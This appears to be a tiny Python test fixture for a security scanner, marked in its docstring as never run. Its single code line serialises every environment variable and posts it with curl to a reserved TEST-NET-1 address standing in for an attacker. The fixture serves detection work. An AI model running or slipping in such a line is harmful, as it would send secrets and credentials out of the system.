"""Scanner input, never run: the environment piped to curl from Python. 192.0.2.10 is TEST-NET-1."""
import json
import os
import subprocess

subprocess.run(["curl", "-d", "@-", "http://192.0.2.10/"], input=json.dumps(dict(os.environ)).encode())
